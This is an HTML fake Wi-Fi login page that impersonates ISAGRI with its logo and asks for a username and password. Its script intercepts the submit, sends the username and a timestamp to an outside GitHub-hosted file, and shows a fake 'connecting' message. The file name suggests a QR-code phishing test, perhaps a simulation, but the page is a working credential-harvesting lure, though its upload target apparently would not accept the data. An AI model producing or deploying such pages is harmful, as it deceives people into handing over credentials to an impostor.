<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/fr/e/e7/Logo_ISAGRI.png" alt="ISAGRI">
        <h2>Connexion Wi-Fi</h2>
        <form id="loginForm">
            <input type="text" id="username" name="username" placeholder="Nom d'utilisateur" required>
            <input type="password" id="password" name="password" placeholder="Mot de passe" required>
            <input type="submit" value="Se connecter">
        </form>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();

            // Capture le nom d'utilisateur et la date/heure actuelle
            const username = document.getElementById('username').value;
            const dateTime = new Date().toLocaleString();

            // Prépare les données à stocker
            const data = `Nom d'utilisateur: ${username}, Date/Heure: ${dateTime}\n`;

            // Envoie les données à un fichier via un endpoint
            fetch('https://raw.githubusercontent.com/balsmr/Test/main/pageqrcode.txt', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: encodeURIComponent(data)
            });

            // Efface le formulaire et affiche un message
            document.querySelector('.login-container').innerHTML = '<h2>Connexion en cours...</h2>';
        });
    </script>
</body>
